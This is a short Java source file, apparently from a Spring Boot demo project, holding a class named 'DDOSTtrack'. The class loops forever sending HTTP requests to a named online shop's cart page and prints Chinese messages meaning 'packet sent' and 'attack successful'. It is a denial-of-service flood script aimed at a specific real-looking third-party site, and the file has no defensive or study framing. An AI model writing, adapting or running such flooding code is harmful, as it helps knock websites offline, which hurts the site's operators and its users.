package com.tgy.demospringboot.ddos;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;

/**
 * @author tanggy
 * @date 2018/10/26
 */

public class DDOSTtrack implements Runnable{

    public void run() {
        while (true) {
            try {
                URL url = new URL("http://www.sjgo365.com/Shopping/Cart");

                URLConnection conn = url.openConnection();
                System.out.println("发包成功！");
                BufferedInputStream bis = new BufferedInputStream(
                        conn.getInputStream());
                byte[] bytes = new byte[1024];
                int len = -1;
                StringBuffer sb = new StringBuffer();

                if (bis != null) {
                    if ((len = bis.read()) != -1) {
                        sb.append(new String(bytes, 0, len));
                        System.out.println("攻击成功！");
                        bis.close();
                    }
                }
            } catch (MalformedURLException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }

        }
    }
}


